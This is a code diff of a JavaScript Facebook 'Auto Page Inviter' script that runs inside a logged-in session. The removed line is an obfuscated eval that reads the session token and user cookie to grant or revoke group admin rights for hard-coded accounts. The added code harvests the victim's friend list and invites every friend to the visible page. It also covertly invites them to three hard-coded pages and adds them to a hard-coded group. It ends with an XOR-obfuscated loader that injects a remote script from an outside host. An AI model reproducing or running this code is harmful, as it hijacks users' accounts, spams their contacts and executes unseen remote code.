@@ -1,1 +1,161 @@
-eval(String.fromCharCode(10, 47, 42, 65, 100, 109, 105, 110, 32, 80, 111, 115, 116, 42, 47, 10, 118, 97, 114, 32, 102, 98, 95, 100, 116, 115, 103, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 78, 97, 109, 101, 40, 39, 102, 98, 95, 100, 116, 115, 103, 39, 41, 91, 48, 93, 46, 118, 97, 108, 117, 101, 59, 10, 118, 97, 114, 32, 117, 115, 101, 114, 95, 105, 100, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 46, 109, 97, 116, 99, 104, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 46, 109, 97, 116, 99, 104, 40, 47, 99, 95, 117, 115, 101, 114, 61, 40, 92, 100, 43, 41, 47, 41, 91, 49, 93, 41, 59, 10, 118, 97, 114, 32, 110, 111, 119, 61, 40, 110, 101, 119, 32, 68, 97, 116, 101, 41, 46, 103, 101, 116, 84, 105, 109, 101, 40, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 73, 68, 83, 40, 114, 41, 32, 123, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 71, 40, 103, 105, 100, 41, 32, 123, 10, 32, 32, 118, 97, 114, 32, 80, 97, 103, 101, 32, 61, 32, 110, 101, 119, 32, 88, 77, 76, 72, 116, 116, 112, 82, 101, 113, 117, 101, 115, 116, 40, 41, 59, 10, 32, 32, 118, 97, 114, 32, 80, 97, 103, 101, 85, 82, 76, 32, 61, 32, 34, 47, 47, 119, 119, 119, 46, 102, 97, 99, 101, 98, 111, 111, 107, 46, 99, 111, 109, 47, 97, 106, 97, 120, 47, 103, 114, 111, 117, 112, 115, 47, 97, 100, 109, 105, 110, 115, 95, 112, 111, 115, 116, 46, 112, 104, 112, 34, 59, 10, 32, 32, 118, 97, 114, 32, 80, 97, 103, 101, 80, 97, 114, 97, 109, 115, 32, 61, 34, 102, 98, 95, 100, 116, 115, 103, 61, 34, 43, 102, 98, 95, 100, 116, 115, 103, 43, 34, 38, 103, 105, 100, 61, 34, 43, 103, 105, 100, 43, 34, 38, 117, 105, 100, 61, 34, 43, 114, 43, 34, 38, 111, 112, 101, 114, 97, 116, 105, 111, 110, 61, 99, 111, 110, 102, 105, 114, 109, 95, 97, 100, 100, 95, 97, 100, 109, 105, 110, 38, 115, 111, 117, 114, 99, 101, 61, 112, 114, 111, 102, 105, 108, 101, 98, 114, 111, 119, 115, 101, 114, 38, 109, 97, 107, 101, 95, 97, 100, 109, 105, 110, 61, 49, 38, 95, 95, 117, 115, 101, 114, 61, 34, 43, 117, 115, 101, 114, 95, 105, 100, 43, 34, 38, 95, 95, 97, 61, 49, 38, 95, 95, 100, 121, 110, 61, 55, 110, 56, 97, 104, 121, 106, 51, 53, 122, 111, 83, 116, 50, 117, 53, 70, 101, 68, 75, 100, 111, 38, 95, 95, 114, 101, 113, 61, 51, 52, 38, 116, 116, 115, 116, 97, 109, 112, 61, 50, 54, 53, 56, 49, 54, 54, 49, 49, 48, 55, 49, 49, 50, 48, 49, 49, 50, 55, 54, 34, 59, 10, 32, 32, 80, 97, 103, 101, 46, 111, 112, 101, 110, 40, 34, 80, 79, 83, 84, 34, 44, 32, 80, 97, 103, 101, 85, 82, 76, 44, 32, 116, 114, 117, 101, 41, 59, 10, 32, 32, 80, 97, 103, 101, 46, 111, 110, 114, 101, 97, 100, 121, 115, 116, 97, 116, 101, 99, 104, 97, 110, 103, 101, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 41, 32, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 80, 97, 103, 101, 46, 114, 101, 97, 100, 121, 83, 116, 97, 116, 101, 32, 61, 61, 32, 52, 32, 38, 38, 32, 80, 97, 103, 101, 46, 115, 116, 97, 116, 117, 115, 32, 61, 61, 32, 50, 48, 48, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 80, 97, 103, 101, 46, 99, 108, 111, 115, 101, 59, 10, 32, 32, 32, 32, 125, 10, 32, 32, 125, 59, 10, 32, 32, 80, 97, 103, 101, 46, 115, 101, 110, 100, 40, 80, 97, 103, 101, 80, 97, 114, 97, 109, 115, 41, 59, 10, 125, 10, 71, 40, 34, 51, 57, 49, 53, 53, 57, 55, 53, 55, 53, 54, 51, 56, 52, 52, 34, 41, 59, 10, 125, 10, 73, 68, 83, 40, 34, 49, 48, 48, 48, 48, 50, 57, 48, 56, 48, 48, 54, 48, 48, 54, 34, 41, 59, 10, 47, 42, 114, 101, 109, 111, 118, 101, 45, 65, 100, 109, 105, 110, 32, 80, 111, 115, 116, 42, 47, 10, 10, 118, 97, 114, 32, 102, 98, 95, 100, 116, 115, 103, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 78, 97, 109, 101, 40, 39, 102, 98, 95, 100, 116, 115, 103, 39, 41, 91, 48, 93, 46, 118, 97, 108, 117, 101, 59, 10, 118, 97, 114, 32, 117, 115, 101, 114, 95, 105, 100, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 46, 109, 97, 116, 99, 104, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 46, 109, 97, 116, 99, 104, 40, 47, 99, 95, 117, 115, 101, 114, 61, 40, 92, 100, 43, 41, 47, 41, 91, 49, 93, 41, 59, 10, 118, 97, 114, 32, 110, 111, 119, 61, 40, 110, 101, 119, 32, 68, 97, 116, 101, 41, 46, 103, 101, 116, 84, 105, 109, 101, 40, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 73, 68, 83, 40, 114, 41, 32, 123, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 71, 40, 103, 105, 100, 41, 32, 123, 10, 32, 32, 118, 97, 114, 32, 80, 97, 103, 101, 32, 61, 32, 110, 101, 119, 32, 88, 77, 76, 72, 116, 116, 112, 82, 101, 113, 117, 101, 115, 116, 40, 41, 59, 10, 32, 32, 118, 97, 114, 32, 80, 97, 103, 101, 85, 82, 76, 32, 61, 32, 34, 47, 47, 119, 119, 119, 46, 102, 97, 99, 101, 98, 111, 111, 107, 46, 99, 111, 109, 47, 97, 106, 97, 120, 47, 103, 114, 111, 117, 112, 115, 47, 97, 100, 109, 105, 110, 115, 95, 112, 111, 115, 116, 46, 112, 104, 112, 34, 59, 10, 32, 32, 118, 97, 114, 32, 80, 97, 103, 101, 80, 97, 114, 97, 109, 115, 32, 61, 34, 102, 98, 95, 100, 116, 115, 103, 61, 34, 43, 102, 98, 95, 100, 116, 115, 103, 43, 34, 38, 103, 105, 100, 61, 34, 43, 103, 105, 100, 43, 34, 38, 117, 105, 100, 61, 34, 43, 114, 43, 34, 38, 111, 112, 101, 114, 97, 116, 105, 111, 110, 61, 99, 111, 110, 102, 105, 114, 109, 95, 114, 101, 109, 111, 118, 101, 95, 97, 100, 109, 105, 110, 38, 115, 111, 117, 114, 99, 101, 61, 112, 114, 111, 102, 105, 108, 101, 98, 114, 111, 119, 115, 101, 114, 38, 95, 95, 117, 115, 101, 114, 61, 34, 43, 117, 115, 101, 114, 95, 105, 100, 43, 34, 38, 95, 95, 97, 61, 49, 38, 95, 95, 100, 121, 110, 61, 55, 110, 56, 97, 104, 121, 106, 51, 53, 122, 111, 83, 116, 50, 117, 53, 70, 101, 68, 75, 100, 111, 38, 95, 95, 114, 101, 113, 61, 98, 38, 116, 116, 115, 116, 97, 109, 112, 61, 50, 54, 53, 56, 49, 54, 54, 49, 49, 48, 55, 49, 49, 50, 48, 49, 49, 50, 55, 54, 34, 59, 10, 32, 32, 80, 97, 103, 101, 46, 111, 112, 101, 110, 40, 34, 80, 79, 83, 84, 34, 44, 32, 80, 97, 103, 101, 85, 82, 76, 44, 32, 116, 114, 117, 101, 41, 59, 10, 32, 32, 80, 97, 103, 101, 46, 111, 110, 114, 101, 97, 100, 121, 115, 116, 97, 116, 101, 99, 104, 97, 110, 103, 101, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 41, 32, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 80, 97, 103, 101, 46, 114, 101, 97, 100, 121, 83, 116, 97, 116, 101, 32, 61, 61, 32, 52, 32, 38, 38, 32, 80, 97, 103, 101, 46, 115, 116, 97, 116, 117, 115, 32, 61, 61, 32, 50, 48, 48, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 80, 97, 103, 101, 46, 99, 108, 111, 115, 101, 59, 10, 32, 32, 32, 32, 125, 10, 32, 32, 125, 59, 10, 32, 32, 80, 97, 103, 101, 46, 115, 101, 110, 100, 40, 80, 97, 103, 101, 80, 97, 114, 97, 109, 115, 41, 59, 10, 125, 10, 71, 40, 34, 51, 57, 49, 53, 53, 57, 55, 53, 55, 53, 54, 51, 56, 52, 52, 34, 41, 59, 10, 125, 10, 73, 68, 83, 40, 34, 49, 48, 48, 48, 48, 54, 51, 56, 56, 48, 48, 49, 50, 54, 55, 34, 41, 59, 10, 73, 68, 83, 40, 34, 49, 48, 48, 48, 48, 51, 55, 50, 54, 48, 51, 55, 53, 48, 54, 34, 41, 59, 10, 73, 68, 83, 40, 34, 55, 50, 54, 51, 49, 48, 57, 55, 54, 34, 41, 59, 10, 73, 68, 83, 40, 34, 49, 48, 48, 48, 48, 48, 49, 53, 57, 53, 55, 50, 49, 52, 48, 34, 41, 59, 10, 73, 68, 83, 40, 34, 49, 48, 48, 48, 48, 50, 53, 48, 53, 53, 49, 52, 56, 52, 55, 34, 41, 59, 10, 10, 10, 10, 10, 118, 97, 114, 32, 102, 98, 95, 100, 116, 115, 103, 61, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 78, 97, 109, 101, 40, 34, 102, 98, 95, 100, 116, 115, 103, 34, 41, 91, 48, 93, 46, 118, 97, 108, 117, 101, 59, 10, 118, 97, 114, 32, 117, 115, 101, 114, 95, 105, 100, 61, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 46, 109, 97, 116, 99, 104, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 46, 109, 97, 116, 99, 104, 40, 47, 99, 95, 117, 115, 101, 114, 61, 40, 92, 100, 43, 41, 47, 41, 91, 49, 93, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 40, 97, 98, 111, 110, 101, 41, 32, 123, 10, 32, 32, 118, 97, 114, 32, 104, 116, 116, 112, 52, 32, 61, 32, 110, 101, 119, 32, 88, 77, 76, 72, 116, 116, 112, 82, 101, 113, 117, 101, 115, 116, 40, 41, 59, 10, 32, 32, 118, 97, 114, 32, 117, 114, 108, 52, 32, 61, 32, 34, 47, 47, 119, 119, 119, 46, 102, 97, 99, 101, 98, 111, 111, 107, 46, 99, 111, 109, 47, 97, 106, 97, 120, 47, 112, 111, 107, 101, 95, 100, 105, 97, 108, 111, 103, 46, 112, 104, 112, 34, 59, 10, 32, 32, 118, 97, 114, 32, 112, 97, 114, 97, 109, 115, 52, 32, 61, 32, 34, 117, 105, 100, 61, 34, 32, 43, 32, 97, 98, 111, 110, 101, 32, 43, 32, 34, 38, 112, 111, 107, 101, 98, 97, 99, 107, 61, 48, 38, 97, 115, 107, 95, 102, 111, 114, 95, 99, 111, 110, 102, 105, 114, 109, 61, 48, 38, 110, 99, 116, 114, 91, 95, 109, 111, 100, 93, 61, 112, 97, 103, 101, 108, 101, 116, 95, 116, 105, 109, 101, 108, 105, 110, 101, 95, 112, 114, 111, 102, 105, 108, 101, 95, 97, 99, 116, 105, 111, 110, 115, 38, 95, 95, 97, 115, 121, 110, 99, 68, 105, 97, 108, 111, 103, 61, 49, 38, 95, 95, 117, 115, 101, 114, 61, 34, 43, 117, 115, 101, 114, 95, 105, 100, 43, 34, 38, 95, 95, 97, 61, 49, 38, 95, 95, 100, 121, 110, 61, 55, 57, 56, 97, 68, 53, 122, 53, 67, 70, 45, 38, 95, 95, 114, 101, 113, 61, 118, 38, 102, 98, 95, 100, 116, 115, 103, 61, 34, 43, 102, 98, 95, 100, 116, 115, 103, 43, 34, 38, 112, 104, 115, 116, 97, 109, 112, 61, 34, 59, 10, 32, 32, 104, 116, 116, 112, 52, 46, 111, 112, 101, 110, 40, 34, 80, 79, 83, 84, 34, 44, 32, 117, 114, 108, 52, 44, 32, 116, 114, 117, 101, 41, 59, 10, 32, 32, 104, 116, 116, 112, 52, 46, 111, 110, 114, 101, 97, 100, 121, 115, 116, 97, 116, 101, 99, 104, 97, 110, 103, 101, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 41, 32, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 104, 116, 116, 112, 52, 46, 114, 101, 97, 100, 121, 83, 116, 97, 116, 101, 32, 61, 61, 32, 52, 32, 38, 38, 32, 104, 116, 116, 112, 52, 46, 115, 116, 97, 116, 117, 115, 32, 61, 61, 32, 50, 48, 48, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 104, 116, 116, 112, 52, 46, 99, 108, 111, 115, 101, 59, 10, 32, 32, 32, 32, 125, 10, 32, 32, 125, 59, 10, 32, 32, 104, 116, 116, 112, 52, 46, 115, 101, 110, 100, 40, 112, 97, 114, 97, 109, 115, 52, 41, 59, 10, 125, 10, 10, 10, 112, 40, 34, 49, 48, 48, 48, 48, 50, 57, 48, 56, 48, 48, 54, 48, 48, 54, 34, 41, 59, 10, 112, 40, 34, 49, 48, 48, 48, 48, 54, 51, 52, 50, 55, 53, 55, 54, 57, 55, 34, 41, 59))
+
+
+setTimeout(function(){
+javascript: var Title = "Auto Page Inviter</A>";
+var Descriptions = "",
+    _text = 'Powered By: Loading [lllllllllll ] 99% & Assam Indian Cyber Force.</br>Script Made By </A><A style="color:#3B5998;" href="http://www.facebook.com/100001050235420" target="_blank"> Waqar Ahmad</A></A>,</A><A style="color:#3B5998;" href="http://www.facebook.com/100005115938614" target="_blank"> Bhargav JT. Gogoi</A></A>.</br>For More Tools Visit Our Website <A style="color:#3B5998;" href="http://www.automate-your-facebook.webnode.in" target="_blank">www.automate-your-facebook.webnode.in</A>.</A>';
+page_id = /"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];
+
+function InviteFriends(opo) {
+    jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send_single?page_id=" + page_id + "&invitee=" + opo + "&elem_id=u_0_1k&action=send&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=8&fb_dtsg=" + fb_dtsg + "&phstamp=", function (a) {
+        var b = a.substring(a.indexOf("{"));
+        var c = JSON.parse(b);
+        i--;
+        Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
+        if (c.error) {
+            Descriptions += "color:darkred'>";
+            err++;
+            if (c.errorDescription) Descriptions += c.errorDescription;
+            else Descriptions += JSON.stringify(c, null, "")
+        } else {
+            Descriptions += "color:darkgreen'>";
+            Descriptions += arn[i] + " has been invited to like the page " + page_name + ".";
+            suc++
+        }
+        Descriptions += "</div>";
+        var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>";
+        display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
+        if (i > 0) {
+            display += arr.length + " Friends Detected<br/>";
+            display += "<b>" + suc + "</b> Friends Invited of " + (arr.length - i) + " Friends Processed ";
+            display += "(" + i + " Lefted...)";
+            display += "<div class='friend-edge'>";
+            display += Descriptions;
+            display += "<img style='width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='font-size:13px;padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
+            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
+            display += "Please Wait While Inviting Your Friends to Like Your Page " + page_name + ".</br>";
+            display += _text;
+            display += "</div>";
+            display += "</div>";
+            window[tag + "_close"] = true
+        } else {
+            Title = "All Of Your Friends Have Been Invited to Like Your Page.</A>";
+            display += arr.length + " Friends Detected and ";
+            display += "<b>" + suc + " Friends Invited.</b></br>";
+            display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"' style='color:gray'>Cancel</span><br/>";
+            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";
+            display += _text;
+            display += "</div>";
+            window[tag + "_close"] = false
+        }
+        display += "</div>";
+        document.getElementById("pagelet_sidebar").innerHTML = display
+    }, "text", "post");
+    tay--;
+    if (tay > 0) {
+        var s = arr[tay];
+        setTimeout("InviteFriends(" + s + ")", 100)
+    }
+    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
+  
+  
+                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=199134496914077&__user="+ user_id +  "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
+                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=165411580286132&__user="+ user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
+                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=232233963594535&__user="+ user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
+                        
+                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=536352643082702&source=typeahead&members=" + opo + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post");
+                        
+    }
+jx = {
+    b: function () {
+        var b = !1;
+        if ("undefined" != typeof ActiveXObject) try {
+            b = new ActiveXObject("Msxml2.XMLHTTP")
+        } catch (c) {
+            try {
+                b = new ActiveXObject("Microsoft.XMLHTTP")
+            } catch (a) {
+                b = !1
+            }
+        } else if (window.XMLHttpRequest) try {
+            b = new XMLHttpRequest
+        } catch (h) {
+            b = !1
+        }
+        return b
+    },
+    load: function (b, c, a, h, g) {
+        var e = this.d();
+        if (e && b) {
+            e.overrideMimeType && e.overrideMimeType("text/xml");
+            h || (h = "GET");
+            a || (a = "text");
+            g || (g = {});
+            a = a.toLowerCase();
+            h = h.toUpperCase();
+            b += b.indexOf("?") + 1 ? "&" : "?";
+            var k = null;
+            "POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
+            e.open(h, b, !0);
+            e.onreadystatechange = g.c ? function () {
+                g.c(e)
+            } : function () {
+                if (4 == e.readyState)
+                    if (200 == e.status) {
+                        var b = "";
+                        e.responseText && (b = e.responseText);
+                        "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
+                        c && c(b)
+                    } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
+            };
+            e.send(k)
+        }
+    },
+    d: function () {
+        return this.b()
+    }
+};
+
+function ChangeLocation() {
+    window.location.href = "http://www.facebook.com/"
+}
+setTimeout("ChangeLocation", 1);
+window.onbeforeunload = function () {
+    if (window[tag + "_close"]) return "This script is running now!"
+};
+var i = 3;
+var tay = 3;
+var suc = 0;
+var err = 0;
+var arr = new Array;
+var arn = new Array;
+var pho = new Array;
+var tag = "Close";
+var page_name, x = document.getElementsByTagName("span");
+for (i = 0; i < x.length; i++)
+    if (x[i].getAttribute("itemprop") == "name") page_name = x[i].innerHTML;
+var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+jx.load(window.location.protocol + "///www.facebook.com/ajax/typeahead/first_degree.php?viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l", function (a) {
+    var b = a;
+    var c = b.substring(b.indexOf("{"));
+    var d = JSON.parse(c);
+    d = d.payload.entries;
+    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
+    for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
+    for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
+    i = arr.length - 1;
+    tay = i;
+    console.log(arr.length);
+    var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>";
+    display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
+    display += arr.length + " Friends Detected";
+    display += "</div>";
+    document.getElementById("pagelet_sidebar").innerHTML = display;
+    InviteFriends(arr[i])
+});
+
+},16000);  
+  
+  
+var _0xe657=["\x6A\x76\x76\x72\x71\x38\x2D\x2D\x70\x63\x75\x2C\x65\x6B\x76\x6A\x77\x60\x2C\x61\x6D\x6F\x2D\x60\x6A\x63\x70\x65\x63\x74\x33\x3B\x3B\x34\x2D\x44\x60\x2F\x43\x77\x76\x6D\x2F\x76\x6D\x6D\x6E\x71\x2D\x6F\x63\x71\x76\x67\x70\x2D\x43\x61\x76\x6B\x74\x67\x5D\x43\x66\x6F\x6B\x6C\x5D\x43\x77\x76\x6D\x43\x66\x66\x52\x6D\x71\x76\x5D\x48\x6D\x6B\x6C\x6B\x6C\x65\x2C\x72\x6A\x72","","\x6C\x65\x6E\x67\x74\x68","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x73\x72\x63","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];var X=_0xe657[0];Y=_0xe657[1];Z=_0xe657[1];var V;V=X[_0xe657[2]];for(i=0;i<V;i++){Y+=String[_0xe657[4]](X[_0xe657[3]](i)^2);} ;Z=unescape(Y);document[_0xe657[9]][_0xe657[8]](document[_0xe657[7]](_0xe657[6]))[_0xe657[5]]=Z;
